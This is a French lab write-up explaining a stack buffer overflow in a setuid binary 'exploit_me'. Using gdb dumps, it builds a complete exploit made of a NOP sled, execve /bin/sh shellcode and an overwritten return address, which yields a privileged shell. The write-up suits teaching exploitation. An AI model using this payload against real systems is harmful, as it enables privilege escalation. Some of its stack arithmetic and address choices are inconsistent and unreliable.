# Shell Code
## Introduction
Cette faille est une variante de la faille `Ret2libc`. Nous allons tenter d'exécuter du code qui ouvre un `shell` administrateur avec l'exécutable `exploit_me` sur le compte utilisateur de `zaz`.

Le but est, grâce à l'`overflow`, d'écrire à un endroit précis de la mémoire pour faire comprendre à l'exécutable la prochaine instruction à exécuter. Nous voulons le rediriger vers notre code.

## Comprendre la stack
Pour comprendre cette faille, il est d'important de comprendre comment fonctionne la `stack`. Tout d'abord, nous savons que `exploit_me` alloue un `buffer` de `140` octets. Nous allons utiliser cette commande pour remplir notre `buffer` de `140` caractères `A` :
```
> ./exploit_me `perl -e 'print "A"x140'`
```

### Représentation

Pour illustrer nos explications, nous allons utiliser `gdb` et désassembler l'exécutable :
```
> gdb exploit_me
[...]
> (gdb) disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:     push   %ebp
   0x080483f5 <+1>:     mov    %esp,%ebp
   0x080483f7 <+3>:     and    $0xfffffff0,%esp
   0x080483fa <+6>:     sub    $0x90,%esp
   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    $0x1,%eax
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    0xc(%ebp),%eax
   0x08048410 <+28>:	add    $0x4,%eax
   0x08048413 <+31>:	mov    (%eax),%eax
   0x08048415 <+33>:	mov    %eax,0x4(%esp)
   0x08048419 <+37>:	lea    0x10(%esp),%eax
   0x0804841d <+41>:	mov    %eax,(%esp)
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    0x10(%esp),%eax
   0x08048429 <+53>:	mov    %eax,(%esp)
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    $0x0,%eax
   0x08048436 <+66>:	leave  
   0x08048437 <+67>:	ret    
End of assembler dump.
```

L'endroit interéssant se situe à la ligne `+44`. Ici, `exploit_me` fait un appel à `strcpy` pour copier le contenu de `eax` dans `esp+0x10`. Autrement dit, nos `140` `A` dans notre buffer.

Voici un schéma de son état juste avant le `call` de `strcpy` :
```
-------------------- esp
Adresse du début
du buffer
--------------------
Adresse des A en
mémoire
--------------------
[...]
--------------------
Buffer
--------------------
[...]
--------------------
Buffer
-------------------- ebp
Sauvegarde de ebp
--------------------
Sauvegarde de eip
--------------------
Adresse des A en
mémoire
--------------------
```

> On peut vérifier ce schéma en exécutant les commandes suivantes :
> ```
> > (gdb) b *0x0804841d
> [...]
> > (gdb) r `perl -e 'print "A"x140'`
> [...]
> ```
> **esp**
> ```
> > (gdb) x $esp+0x04
> 0xbffff624:	0xbffff887
> > (gdb) x 0xbffff887
> 0xbffff887:	0x41414141
> ```
> On retrouve bien ici nos `A` sous forme héxadécimale.
>
> **ebp**
> ```
> > (gdb) x $ebp
> 0xbffff6b8:     0x00000000
> ```
> `ebp` est initialisé à 0 au lancement du programme.
> 
> **eip**
> ```
> > (gdb) x $ebp+0x04
> 0xbffff6bc:     0xb7e454d3
> > (gdb) x 0xb7e454d3
> 0xb7e454d3 <__libc_start_main+243>:	0xe8240489
> ```
> `eip` contient l'adresse de la fonction `main`.

### Affichage

Pour pouvoir afficher la `stack` et visualiser notre `buffer`, nous allons d'abord déterminer le nombre de cases mémoires à afficher entre `esp` et `ebp`. Pour cela, on peut faire un calcul simple :
```
nombre_de_cases_a_afficher = adresse_ebp - adresse_esp 
```

Dans `gdb` on exécute donc :
```
> (gdb) x $esp
> 0xbffff620:	0xbffff630
> (gdb) x $ebp
> 0xbffff6b8:	0x68732f6e
```
On applique donc notre calcul :
```
nombre_de_cases_a_afficher = 0x68732f6e - 0xbffff630
                           = 0x98
                           = 152 (base 10)
```
On divise par `4` pour avoir une valeur en octets :
```
152 / 4 = 38
```
Nous savons donc qu'il nous faudra afficher `38` cases mémoire pour afficher l'ensemble des cases entre `esp` et `ebp`. Néanmoins, il sera important pour d'afficher la stack jusqu'à `eip`. Pour cela, on ajoute `2` à notre résultat pour afficher `2` registres de plus.

Pour afficher notre stack, on exécute donc dans gdb :
```
> (gdb) x/40wx $esp
0xbffff620: 0xbffff66e	0xbffff887	0x00000001	0xb7ec3c49
0xbffff630:	0xbffff66f	0xbffff66e	0x00000000	0xb7ff3fec
0xbffff640:	0xbffff6f4	0xb7fdd000	0x00000000	0xb7e5ec73
0xbffff650:	0x08048241	0x00000000	0x00c30000	0x00000001
0xbffff660:	0xbffff872	0x0000002f	0xbffff6bc	0xb7fd0ff4
0xbffff670:	0x08048440	0x080496e8	0x00000002	0x080482dd
0xbffff680:	0xb7fd13e4	0x00000016	0x080496e8	0x08048461
0xbffff690:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff6a0:	0xb7fed280	0x00000000	0x08048449	0xb7fd0ff4
0xbffff6b0:	0x08048440	0x00000000	0x00000000	0xb7e454d3
                                    ^           ^
                                    ebp         eip
```
Les deux derniers registres nous permettent de vérifier nos affirmations. Maintenant, affichons la stack juste après l'appel à `strcpy` :
```
> (gdb) b *0x08048425
[...]
> (gdb) c
[...]
> (gdb) x/40wx $esp
0xbffff620:	0xbffff630	0xbffff887	0x00000001	0xb7ec3c49
0xbffff630:	0x41414141	0x41414141	0x41414141	0x41414141
            ^
            début du buffer
0xbffff640:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff650:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff680:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff690:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6b0:	0x41414141	0x41414141	0x41414141	0xb7e45400
                                    ^           ^
                                    fin du      eip
                                    buffer
```

Avec ces résultat, nous sommes capable de déterminer comment nous allons remplir notre buffer, pour :
1. Insérer notre code à exécuter.
2. Remplacer l'adresse de `eip` pour rediriger le programme vers notre code.

### Remplissage du buffer

Le code que nous allons exécuter est un `shell code`. Il nous permettra simplement de lancer un `shell`, mais avec les droits du programme exécuté. Dans notre cas, les droits administrateurs. Nous n'allons pas rentrer dans les détails pour obtenir un `shell code`. Voici [celui que nous allons utiliser](https://beta.hackndo.com/buffer-overflow/) :
```
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

Notre `shell code` fait `45` octets. Or, notre buffer a une taille de `140` octets. Nous allons donc concaténer des instructions `NOP` (No OPeration) avec notre `shell code`. Nous pouvons déterminer le nombre d'instructions `NOP` à ajouter avec ce calcul :
```
140 - 45 = 95
```
Nous aurons donc besoin de `95` instructions `NOP`.

Toujours dans `gdb`, relançons notre exécutable avec l'associations des `NOP` :
```
> (gdb) delete
[...]
> (gdb) b *0x08048425
[...]
> (gdb) r `perl -e 'print "\x90"x95 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
[...]
> (gdb) x/40wx $esp
0xbffff620:	0xbffff630	0xbffff887	0x00000001	0xb7ec3c49
0xbffff630:	0x90909090	0x90909090	0x90909090	0x90909090
            ^
            NOP
0xbffff640:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff650:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff660:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff670:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff680:	0x90909090	0x90909090	0x90909090	0xeb909090
                                                ^
                                                début du shell code
0xbffff690:	0x76895e1f	0x88c03108	0x46890746	0x890bb00c
0xbffff6a0:	0x084e8df3	0xcd0c568d	0x89db3180	0x80cd40d8
0xbffff6b0:	0xffffdce8	0x69622fff	0x68732f6e	0xb7e45400
                                    ^           ^
                                    fin du      eip
                                    shell code
```
> L'écriture des registres en mémoire se fait de droite à gauche. C'est pour cela que `0xeb` semble apparaitre au milieu des instructions `NOP`. En réalité, il symbolise bien le début de notre `shell code`.

Nous avons remplit notre buffer correctement, sans écraser la valeur de `eip`.

### Exécution du shell code

Pour exécuter notre `shell code`, nous allons écraser la valeur de `eip`, de sorte à rediriger le programme sur notre shell code. Reprenons donc notre stack après notre appel à `strcpy`.
```
0xbffff620:	0xbffff630	0xbffff887	0x00000001	0xb7ec3c49
0xbffff630:	0x90909090	0x90909090	0x90909090	0x90909090
            ^
            NOP
0xbffff640:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff650:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff660:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff670:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff680:	0x90909090	0x90909090	0x90909090	0xeb909090
                                                ^
                                                début du shell code
0xbffff690:	0x76895e1f	0x88c03108	0x46890746	0x890bb00c
0xbffff6a0:	0x084e8df3	0xcd0c568d	0x89db3180	0x80cd40d8
0xbffff6b0:	0xffffdce8	0x69622fff	0x68732f6e	0xb7e45400
                                    ^           ^
                                    fin du      eip
                                    shell code
```
Nous allons rediriger `eip` sur une de nos instructions `NOP`. Cela va permettre au programme d'enchainer les instructions `NOP` jusqu'à atteindre notre `shell code`. Prenons donc une adresse qui tombe sur une instructions `NOP`. Exemple : `0xbffff640`. Nous allons donc rajouter cette adresse à la chaine de caractère qui ira dans notre buffer, de sorte à ce que notre overflow remplace la valeur de `eip` par une adresse `NOP`.
```
`perl -e 'print "\x90"x95 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x50\xf6\xff\xbf"'`
```
En exécutant, hors `gdb`, `exploit_me` avec cet argument, nous somme capable de lancer un `shell` avec les droit administrateurs.
```
./exploit_me `perl -e 'print "\x90"x95 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x50\xf6\xff\xbf"'`
```
